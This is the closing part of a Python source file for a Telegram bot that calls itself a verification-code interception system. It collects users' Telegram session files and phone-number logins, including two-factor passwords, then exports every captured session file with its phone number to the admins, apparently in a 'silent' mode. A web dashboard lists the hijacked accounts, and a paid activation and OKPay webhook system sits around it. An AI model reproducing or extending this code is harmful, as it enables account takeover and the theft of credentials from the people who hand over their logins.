            await update.message.reply_text("❌ 用户ID必须是数字")
            return

        success, msg = AdminManager.remove_admin(admin_id, user_id)
        await update.message.reply_text(msg, parse_mode='HTML')

    @staticmethod
    async def cmd_list_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """列出所有管理员"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        admins = AdminManager.list_admins()

        if not admins:
            await update.message.reply_text("📭 暂无管理员")
            return

        lines = ["👑 <b>管理员列表</b>\n"]
        for admin in admins:
            lines.append(f"{admin['type']}: <code>{admin['id']}</code>")

        await update.message.reply_text("\n".join(lines), parse_mode='HTML')

    # ---------- 备用卡密命令 ----------

    @staticmethod
    async def cmd_gen_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """生成备用卡密（管理员）"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        count = 1
        note = ''
        if context.args:
            if context.args[0].isdigit():
                count = min(int(context.args[0]), 20)
                note = ' '.join(context.args[1:]) if len(context.args) > 1 else ''
            else:
                note = ' '.join(context.args)

        keys = []
        for _ in range(count):
            key = BackupKeyManager.generate_key(note, user_id)
            keys.append(key)

        lines = '\n'.join(f"<code>{k}</code>" for k in keys)
        await update.message.reply_text(
            f"🔑 <b>已生成 {count} 张备用卡密</b>\n"
            f"（用于特殊用户激活，不经过支付）\n\n"
            f"{lines}\n\n"
            f"{'📝 备注：' + note if note else ''}",
            parse_mode='HTML'
        )

    @staticmethod
    async def cmd_list_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """列出备用卡密（管理员）"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        show_all = context.args and context.args[0].lower() == 'all'
        keys = BackupKeyManager.list_keys(only_unused=not show_all)

        if not keys:
            await update.message.reply_text(
                "📭 暂无" + ("全部" if show_all else "未使用的") + "备用卡密"
            )
            return

        lines = []
        for k in keys[:50]:
            status = "✅ 未用" if not k["used"] else f"❌ 已用（uid:{k['used_by']}）"
            note = f"  备注:{k['note']}" if k.get("note") else ''
            lines.append(f"<code>{k['key']}</code> {status}{note}")

        text = f"🔑 <b>备用卡密列表</b>（{'全部' if show_all else '未使用'}，共{len(keys)}张）\n\n"
        text += '\n'.join(lines)
        if len(keys) > 50:
            text += f"\n\n…还有 {len(keys)-50} 张未显示"

        await update.message.reply_text(text, parse_mode='HTML')

    @staticmethod
    async def cmd_use_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """用户使用备用卡密激活"""
        user_id = update.effective_user.id

        # 检查是否已激活
        if PaymentManager.check_payment_status(user_id)["status"] == "paid":
            await update.message.reply_text("✅ 您已激活，无需重复操作")
            return

        if not context.args:
            await update.message.reply_text(
                "💡 <b>使用备用卡密</b>\n\n"
                "用法：<code>/use 卡密</code>\n"
                "示例：<code>/use ABC12345</code>\n\n"
                "⚠️ 这是管理员提供的特殊激活码，普通用户请走支付流程。",
                parse_mode='HTML'
            )
            return

        key = context.args[0].strip().upper()
        result = BackupKeyManager.use_key(user_id, key)

        if result["ok"]:
            await update.message.reply_text(
                "🎉 <b>激活成功！</b>\n\n"
                "您已通过备用卡密激活，发送 /start 开始使用。",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                f"❌ <b>激活失败</b>\n{result['reason']}\n\n"
                "请检查卡密是否正确，或联系管理员。",
                parse_mode='HTML'
            )

    # ---------- 用户管理命令 ----------

    @staticmethod
    async def cmd_force_pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """管理员：强制激活用户"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        if not context.args:
            await update.message.reply_text(
                "👑 <b>强制激活用户</b>\n\n"
                "用法：<code>/forcepay 用户ID [备注]</code>\n"
                "示例：<code>/forcepay 123456789 补偿用户</code>",
                parse_mode='HTML'
            )
            return

        try:
            target_user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ 用户ID必须是数字")
            return

        note = ' '.join(context.args[1:]) if len(context.args) > 1 else '管理员强制'

        # 检查是否已激活
        if PaymentManager.check_payment_status(target_user_id)["status"] == "paid":
            await update.message.reply_text(f"⚠️ 用户 {target_user_id} 已激活")
            return

        PaymentManager.mark_user_paid(target_user_id, f"force:{note}", {"admin": user_id, "note": note})
        await update.message.reply_text(
            f"✅ 已强制激活用户：<code>{target_user_id}</code>\n"
            f"📝 备注：{note}",
            parse_mode='HTML'
        )

        # 尝试通知用户
        try:
            await context.bot.send_message(
                target_user_id,
                "🎉 <b>您的账号已被管理员激活！</b>\n\n发送 /start 开始使用。",
                parse_mode='HTML'
            )
        except Exception as e:
            logger.warning(f"通知用户失败: {e}")

    @staticmethod
    async def cmd_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """管理员：查看用户状态"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        if not context.args:
            await update.message.reply_text(
                "👑 <b>查看用户状态</b>\n\n"
                "用法：<code>/userinfo 用户ID</code>\n"
                "示例：<code>/userinfo 123456789</code>",
                parse_mode='HTML'
            )
            return

        try:
            target_user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ 用户ID必须是数字")
            return

        # 付款状态
        ps = PaymentManager.check_payment_status(target_user_id)

        # 订单信息
        payments = load_json_file(Config.PAYMENT_FILE, {})
        user_id_str = str(target_user_id)

        lines = [
            f"👤 <b>用户信息</b>",
            f"用户ID: <code>{target_user_id}</code>",
        ]

        if ps["status"] == "paid":
            lines.append("状态: ✅ <b>已激活</b>")
            lines.append(f"激活时间: {ps['data'].get('paid_at', '未知')}")
            lines.append(f"激活方式: {ps['data'].get('via', '未知')}")
        else:
            lines.append("状态: ❌ <b>未激活</b>")
            if user_id_str in payments:
                order = payments[user_id_str]
                lines.append(f"订单号: {order.get('order_id', '无')}")
                lines.append(f"金额: {order.get('amount', '未知')} {order.get('coin', '')}")
                lines.append(f"状态: {order.get('status', '未知')}")

        # 检查是否已加入频道
        if JoinRecordManager.is_recorded(target_user_id):
            lines.append("频道验证: ✅ 已通过")
        else:
            lines.append("频道验证: ❌ 未验证")

        # 检查活跃会话
        sessions = SessionManager.get_active_sessions(target_user_id)
        lines.append(f"活跃会话: {len(sessions)} 个")

        await update.message.reply_text("\n".join(lines), parse_mode='HTML')

    @staticmethod
    async def cmd_reset_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """管理员：重置用户激活状态"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        if not context.args:
            await update.message.reply_text(
                "👑 <b>重置用户激活状态</b>\n\n"
                "用法：<code>/resetuser 用户ID</code>\n"
                "示例：<code>/resetuser 123456789</code>\n\n"
                "⚠️ 重置后用户需要重新激活",
                parse_mode='HTML'
            )
            return

        try:
            target_user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ 用户ID必须是数字")
            return

        success = PaymentManager.reset_user(target_user_id)

        if success:
            await update.message.reply_text(
                f"✅ 已重置用户 <code>{target_user_id}</code> 的激活状态",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(f"⚠️ 用户 {target_user_id} 没有记录")

    @staticmethod
    async def cmd_check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """管理员：检查用户是否加入频道"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        if not context.args:
            await update.message.reply_text(
                "👑 <b>检查用户频道加入状态</b>\n\n"
                "用法：<code>/checkjoin 用户ID</code>\n"
                "示例：<code>/checkjoin 123456789</code>",
                parse_mode='HTML'
            )
            return

        try:
            target_user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ 用户ID必须是数字")
            return

        is_joined, msg = await ChannelVerifier.check_user_in_channel(context, target_user_id)

        if is_joined:
            await update.message.reply_text(
                f"✅ <b>用户 {target_user_id}</b>\n"
                f"状态：已加入频道\n\n"
                f"📢 频道：{Config.REQUIRED_CHANNEL or '已禁用'}",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                f"❌ <b>用户 {target_user_id}</b>\n"
                f"状态：未加入频道\n\n"
                f"📢 频道：{Config.REQUIRED_CHANNEL or '已禁用'}\n\n"
                f"请提醒用户加入频道后使用 /start 重新验证。",
                parse_mode='HTML'
            )

    @staticmethod
    async def cmd_clear_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """管理员：清除用户加入记录"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        if not context.args:
            await update.message.reply_text(
                "👑 <b>清除用户加入记录</b>\n\n"
                "用法：<code>/clearjoin 用户ID</code>\n"
                "示例：<code>/clearjoin 123456789</code>\n\n"
                "⚠️ 清除后用户需要重新验证频道加入状态",
                parse_mode='HTML'
            )
            return

        try:
            target_user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ 用户ID必须是数字")
            return

        success = JoinRecordManager.clear_record(target_user_id)

        if success:
            await update.message.reply_text(
                f"✅ 已清除用户 {target_user_id} 的加入记录\n"
                f"用户下次使用将需要重新验证频道加入状态。"
            )
        else:
            await update.message.reply_text(f"⚠️ 用户 {target_user_id} 没有加入记录")

    # ============================================================
    #  导出Session命令 - 支持导出所有用户发送给全体管理员
    # ============================================================

    @staticmethod
    async def cmd_export_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """管理员：导出session（支持单个用户或全部用户）"""
        user_id = update.effective_user.id

        if not AdminManager.is_admin(user_id):
            await update.message.reply_text("❌ 无权限")
            return

        # 获取所有管理员ID
        admins = AdminManager.list_admins()
        admin_ids = [a['id'] for a in admins]

        # 解析参数
        if not context.args:
            # 默认：导出所有用户
            await update.message.reply_text(
                "👑 <b>导出Session</b>\n\n"
                "用法：\n"
                "• <code>/exportsession all</code> - 导出所有用户的session（发送给所有管理员）\n"
                "• <code>/exportsession 用户ID</code> - 导出指定用户的session\n\n"
                "⚠️ 所有导出的session将发送给全体管理员",
                parse_mode='HTML'
            )
            return

        target = context.args[0].lower()

        # ===== 导出所有用户 =====
        if target == "all":
            await update.message.reply_text("📤 正在收集所有用户的session文件...")

            all_sessions = SessionManager.get_all_sessions()
            
            if not all_sessions:
                await update.message.reply_text("ℹ️ 当前没有活跃会话")
                return

            # 统计总session数
            total_sessions = sum(len(phones) for phones in all_sessions.values())
            await update.message.reply_text(f"📊 找到 {len(all_sessions)} 个用户，共 {total_sessions} 个session文件")

            # 逐个导出
            exported = 0
            failed = 0
            
            for uid, phones in all_sessions.items():
                for phone, info in phones.items():
                    session_path = info.get("file_path")
                    if session_path and session_path.exists():
                        success = await BotHandlers._export_session_to_admins(
                            update.get_bot(), uid, phone, session_path, admin_ids
                        )
                        if success:
                            exported += 1
                        else:
                            failed += 1
                    else:
                        failed += 1

            await update.message.reply_text(
                f"✅ <b>批量导出完成！</b>\n"
                f"成功: {exported} 个\n"
                f"失败: {failed} 个\n"
                f"已发送给 {len(admin_ids)} 位管理员",
                parse_mode='HTML'
            )
            return

        # ===== 导出指定用户 =====
        try:
            target_user_id = int(target)
        except ValueError:
            await update.message.reply_text("❌ 参数错误，请输入数字用户ID或 'all'")
            return

        sessions = SessionManager.get_active_sessions(target_user_id)
        
        if not sessions:
            await update.message.reply_text(f"ℹ️ 用户 {target_user_id} 没有活跃会话")
            return

        await update.message.reply_text(f"📤 正在导出用户 {target_user_id} 的 {len(sessions)} 个会话...")
        
        exported = 0
        for phone, info in sessions.items():
            session_path = info.get("file_path")
            if session_path and session_path.exists():
                success = await BotHandlers._export_session_to_admins(
                    update.get_bot(), target_user_id, phone, session_path, admin_ids
                )
                if success:
                    exported += 1

        await update.message.reply_text(
            f"✅ 导出完成！成功导出 {exported}/{len(sessions)} 个会话，已发送给 {len(admin_ids)} 位管理员。"
        )

    @staticmethod
    async def _export_session_to_admins(bot, user_id: int, phone: str, 
                                         session_path: Path, admin_ids: List[int]) -> bool:
        """
        将session文件发送给所有管理员
        Args:
            bot: Telegram Bot实例
            user_id: 用户ID
            phone: 手机号
            session_path: session文件路径
            admin_ids: 管理员ID列表
        Returns:
            是否成功（至少发送给一位管理员）
        """
        if not session_path.exists():
            logger.warning(f"Session文件不存在: {session_path}")
            return False

        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # 尝试获取用户名
            user_info = f"用户ID: {user_id}"
            try:
                user = await bot.get_chat(user_id)
                if user.username:
                    user_info += f"\n用户名: @{user.username}"
                if user.first_name:
                    user_info += f"\n昵称: {user.first_name}"
            except:
                pass

            caption = (
                f"📱 <b>Session文件导出</b>\n\n"
                f"👤 {user_info}\n"
                f"📞 手机号: <code>{phone}</code>\n"
                f"⏰ 导出时间: {timestamp}\n"
                f"📁 文件名: <code>{session_path.name}</code>"
            )

            # 读取文件内容
            with open(session_path, 'rb') as f:
                file_data = f.read()

            # 发送给所有管理员
            sent_count = 0
            for admin_id in admin_ids:
                try:
                    # 重新创建文件对象（因为读取后需要重新加载）
                    await bot.send_document(
                        chat_id=admin_id,
                        document=file_data,
                        filename=f"{phone}.session",
                        caption=caption,
                        parse_mode='HTML'
                    )
                    sent_count += 1
                    logger.info(f"✅ Session {phone} 已发送给管理员 {admin_id}")
                except Exception as e:
                    logger.error(f"❌ 发送给管理员 {admin_id} 失败: {e}")

            return sent_count > 0

        except Exception as e:
            logger.error(f"❌ 导出Session失败 ({phone}, 用户: {user_id}): {e}")
            return False


# ============================================================
#  18. Web 后台
# ============================================================

class WebAdmin:
    """Web管理后台类"""

    app = Flask(__name__)

    @staticmethod
    def _check_auth(username: str, password: str) -> bool:
        """检查认证"""
        return username == Config.WEB_USER and password == Config.WEB_PASS

    @staticmethod
    def _auth_required():
        """要求认证"""
        from flask import Response
        return Response(
            '请输入用户名和密码',
            401,
            {'WWW-Authenticate': 'Basic realm="Admin Login"'}
        )

    @classmethod
    def setup_routes(cls):
        """设置路由"""
        web_app = cls.app

        @web_app.before_request
        def require_login():
            auth = request.authorization
            if not auth or not cls._check_auth(auth.username, auth.password):
                return cls._auth_required()

        @web_app.route("/")
        def admin_index():
            """后台首页"""
            # 获取快照
            all_sessions = SessionManager.get_all_sessions()

            active_snapshot = {}
            for uid, phones in all_sessions.items():
                active_snapshot[uid] = {
                    phone: {'file_path': str(info.get('file_path', ''))}
                    for phone, info in phones.items()
                }

            total_files = 0
            if Config.SESSIONS_DIR.exists():
                for user_dir in Config.SESSIONS_DIR.iterdir():
                    if user_dir.is_dir():
                        total_files += len(list(user_dir.glob("*.session")))

            # 统计付款
            payments = load_json_file(Config.PAYMENT_FILE, {})
            paid_count = sum(1 for v in payments.values() if v.get("status") == "paid")

            HTML_TEMPLATE = """
            <!DOCTYPE html>
            <html lang="zh-CN">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>验证码拦截系统 - 管理后台</title>
                <style>
                    * { box-sizing: border-box; margin: 0; padding: 0; }
                    body { font-family: -apple-system, 'Segoe UI', sans-serif; background: #0f1117; color: #e0e0e0; min-height: 100vh; }
                    .header { background: linear-gradient(135deg, #1a1d2e, #252840); padding: 20px 40px; border-bottom: 1px solid #2e3150; display: flex; align-items: center; gap: 20px; flex-wrap: wrap; }
                    .header h1 { font-size: 20px; font-weight: 600; color: #fff; }
                    .header .time { font-size: 13px; color: #6b7280; margin-left: auto; }
                    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 16px; padding: 24px 40px; }
                    .stat-card { background: #1a1d2e; border: 1px solid #2e3150; border-radius: 12px; padding: 16px 24px; }
                    .stat-card .num { font-size: 28px; font-weight: 700; color: #818cf8; }
                    .stat-card .label { font-size: 12px; color: #6b7280; margin-top: 4px; }
                    .container { padding: 0 40px 40px; }
                    .user-block { background: #1a1d2e; border: 1px solid #2e3150; border-radius: 12px; margin-bottom: 16px; overflow: hidden; }
                    .user-header { background: #1e2236; padding: 12px 20px; border-bottom: 1px solid #2e3150; display: flex; align-items: center; gap: 12px; }
                    .user-header .uid { font-size: 12px; background: #252840; color: #818cf8; padding: 2px 10px; border-radius: 16px; font-family: monospace; }
                    .user-header .badge { font-size: 11px; background: #1a3a2a; color: #4ade80; padding: 2px 10px; border-radius: 16px; }
                    table { width: 100%; border-collapse: collapse; }
                    th { background: #16192a; padding: 10px 20px; text-align: left; font-size: 11px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.5px; }
                    td { padding: 12px 20px; border-top: 1px solid #1e2236; font-size: 13px; }
                    .phone { font-family: monospace; color: #e0e7ff; }
                    .status-alive { color: #4ade80; font-size: 12px; }
                    .status-offline { color: #ef4444; font-size: 12px; }
                    .empty { text-align: center; color: #6b7280; padding: 60px 20px; }
                    .refresh-btn { position: fixed; bottom: 30px; right: 30px; background: #4f46e5; color: #fff; border: none; padding: 12px 24px; border-radius: 30px; cursor: pointer; font-size: 14px; text-decoration: none; }
                    .refresh-btn:hover { background: #6366f1; }
                    @media (max-width: 600px) { .header { padding: 16px 20px; } .stats { padding: 16px 20px; } .container { padding: 0 20px 20px; } }
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>📊 验证码拦截系统</h1>
                    <span class="time">{{ now }}</span>
                </div>
                <div class="stats">
                    <div class="stat-card"><div class="num">{{ total_users }}</div><div class="label">活跃用户</div></div>
                    <div class="stat-card"><div class="num">{{ total_active }}</div><div class="label">运行中账号</div></div>
                    <div class="stat-card"><div class="num">{{ total_files }}</div><div class="label">会话文件</div></div>
                    <div class="stat-card"><div class="num">{{ paid_count }}</div><div class="label">已激活用户</div></div>
                </div>
                <div class="container">
                    {% if active_data %}
                        {% for user_id, phones in active_data.items() %}
                        <div class="user-block">
                            <div class="user-header">
                                <span class="uid">用户 {{ user_id }}</span>
                                <span class="badge">{{ phones|length }} 个账号</span>
                            </div>
                            <table>
                                <thead><tr><th>手机号</th><th>状态</th><th>Session 路径</th></tr></thead>
                                <tbody>
                                {% for phone, info in phones.items() %}
                                <tr>
                                    <td class="phone">{{ phone }}</td>
                                    <td><span class="status-alive">● 运行中</span></td>
                                    <td style="font-size: 12px; color: #6b7280;">{{ info.file_path }}</td>
                                </tr>
                                {% endfor %}
                                </tbody>
                            </table>
                        </div>
                        {% endfor %}
                    {% else %}
                        <div class="empty">📭 暂无活跃会话</div>
                    {% endif %}
                </div>
                <a class="refresh-btn" href="/">🔄 刷新</a>
            </body>
            </html>
            """

            return render_template_string(
                HTML_TEMPLATE,
                now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                total_users=len(active_snapshot),
                total_active=sum(len(v) for v in active_snapshot.values()),
                total_files=total_files,
                paid_count=paid_count,
                active_data=active_snapshot
            )

        @web_app.route("/api/stats")
        def api_stats():
            """API统计接口"""
            all_sessions = SessionManager.get_all_sessions()
            payments = load_json_file(Config.PAYMENT_FILE, {})
            paid_count = sum(1 for v in payments.values() if v.get("status") == "paid")

            return jsonify({
                "total_users": len(all_sessions),
                "total_active": sum(len(v) for v in all_sessions.values()),
                "paid_users": paid_count,
                "timestamp": datetime.now().isoformat()
            })

    @classmethod
    def run(cls):
        """运行Web服务器"""
        cls.setup_routes()
        logger.info(f"Web后台启动: http://{Config.WEBHOOK_HOST}:{Config.WEB_ADMIN_PORT}")
        cls.app.run(
            host=Config.WEBHOOK_HOST,
            port=Config.WEB_ADMIN_PORT,
            debug=False,
            use_reloader=False
        )


# ============================================================
#  19. Webhook 服务器
# ============================================================

class WebhookServer:
    """Webhook回调服务器"""

    app = Flask(__name__)

    @classmethod
    def setup_routes(cls):
        """设置路由"""
        web_app = cls.app

        @web_app.route("/", methods=["GET"])
        def index():
            return "OKPay Webhook Server Running"

        @web_app.route(Config.WEBHOOK_PATH, methods=["POST"])
        def webhook_handler():
            """处理OKPay回调"""
            try:
                # 获取数据
                data = request.get_json()
                if not data:
                    data = request.form.to_dict()

                if not data:
                    return jsonify({"status": "error", "message": "No data"}), 200

                logger.info(f"收到Webhook回调: {data}")

                # 处理回调
                result = PaymentService.handle_webhook(data)

                if result["ok"]:
                    logger.info(f"Webhook处理成功: {result}")
                    return jsonify({"status": "success", "message": result["message"]}), 200
                else:
                    logger.warning(f"Webhook处理失败: {result}")
                    return jsonify({"status": "error", "message": result["message"]}), 200

            except Exception as e:
                logger.error(f"Webhook处理异常: {e}")
                return jsonify({"status": "error", "message": str(e)}), 200

        @web_app.route("/webhook/test", methods=["GET"])
        def webhook_test():
            """测试接口"""
            return jsonify({
                "status": "ok",
                "message": "Webhook is working",
                "webhook_path": Config.WEBHOOK_PATH
            })

    @classmethod
    def run(cls):
        """运行Webhook服务器"""
        cls.setup_routes()
        logger.info(f"Webhook服务器启动: http://{Config.WEBHOOK_HOST}:{Config.WEBHOOK_PORT}{Config.WEBHOOK_PATH}")
        cls.app.run(
            host=Config.WEBHOOK_HOST,
            port=Config.WEBHOOK_PORT,
            debug=False,
            use_reloader=False
        )


# ============================================================
#  20. 启动入口
# ============================================================

async def post_init(application: Application):
    """启动后的初始化"""
    logger.info("Bot启动完成，开始扫描会话...")
    await SessionManager.scan_and_restore_all(application.bot)


def main():
    """主入口函数"""
    # 初始化
    init_directories()
    setup_logging()

    logger.info("=" * 50)
    logger.info("Telegram 验证码拦截系统 - 完整增强版 (静默导出)")
    logger.info("=" * 50)

    # 刷新管理员缓存
    AdminManager.refresh_cache()

    # 启动 Web 后台（端口 39998）
    web_thread = threading.Thread(target=WebAdmin.run, daemon=True)
    web_thread.start()
    logger.info(f"Web后台: http://0.0.0.0:{Config.WEB_ADMIN_PORT}")

    # 启动 Webhook 服务器（端口 39999）
    webhook_thread = threading.Thread(target=WebhookServer.run, daemon=True)
    webhook_thread.start()
    logger.info(f"Webhook: http://0.0.0.0:{Config.WEBHOOK_PORT}{Config.WEBHOOK_PATH}")

    # 创建Bot应用
    application = Application.builder().token(Config.BOT_TOKEN).post_init(post_init).build()

    # ===== 对话处理器 =====
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', BotHandlers.start),
            MessageHandler(
                filters.Regex(r'^(📁 上传会话文件|📱 手机号登录|⚙️ 账号管理)'),
                BotHandlers.entry
            )
        ],
        states={
            PHONE_INPUT: [
                MessageHandler(
                    filters.Document.ALL | filters.TEXT & ~filters.COMMAND,
                    BotHandlers.handle_phone_or_file
                )
            ],
            VERIFICATION_CODE: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    BotHandlers.handle_verification_code
                )
            ],
            TWO_FACTOR_PASSWORD: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    BotHandlers.handle_two_factor
                )
            ],
        },
        fallbacks=[CommandHandler('start', BotHandlers.start)],
        allow_reentry=True
    )

    application.add_handler(conv_handler)

    # ===== 回调处理器 =====
    application.add_handler(CallbackQueryHandler(
        BotHandlers.handle_callback,
        pattern=r'^(stop_single:|stop_all|noop|verify_join|show_pay_link|check_pay:)'
    ))

    # ===== 管理员管理命令 =====
    application.add_handler(CommandHandler('addadmin', BotHandlers.cmd_add_admin))
    application.add_handler(CommandHandler('removeadmin', BotHandlers.cmd_remove_admin))
    application.add_handler(CommandHandler('listadmins', BotHandlers.cmd_list_admins))

    # ===== 备用卡密命令 =====
    application.add_handler(CommandHandler('gencard', BotHandlers.cmd_gen_card))
    application.add_handler(CommandHandler('listcards', BotHandlers.cmd_list_cards))
    application.add_handler(CommandHandler('use', BotHandlers.cmd_use_card))

    # ===== 用户管理命令 =====
    application.add_handler(CommandHandler('forcepay', BotHandlers.cmd_force_pay))
    application.add_handler(CommandHandler('userinfo', BotHandlers.cmd_user_info))
    application.add_handler(CommandHandler('resetuser', BotHandlers.cmd_reset_user))

    # ===== 频道管理命令 =====
    application.add_handler(CommandHandler('checkjoin', BotHandlers.cmd_check_join))
    application.add_handler(CommandHandler('clearjoin', BotHandlers.cmd_clear_join))

    # ===== 导出命令 =====
    application.add_handler(CommandHandler('exportsession', BotHandlers.cmd_export_session))

    # ===== 启动信息 =====
    logger.info("=" * 50)
    logger.info("Bot 启动成功 ✅")
    logger.info(f"超级管理员: {Config.SUPER_ADMIN_IDS}")
    logger.info(f"普通管理员: {[a['id'] for a in AdminManager.list_admins() if not a['is_super']]}")
    logger.info(f"要求加入频道: {Config.REQUIRED_CHANNEL or '已禁用'}")
    logger.info(f"导出频道: {Config.FORWARD_CHANNEL or '未配置'} (静默模式)")
    logger.info(f"支付金额: {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}")
    logger.info("=" * 50)

    # 启动轮询
    application.run_polling()


if __name__ == '__main__':
    # 定义对话状态（在main之前定义，供其他函数使用）
    PHONE_INPUT, VERIFICATION_CODE, TWO_FACTOR_PASSWORD = range(3)
    main()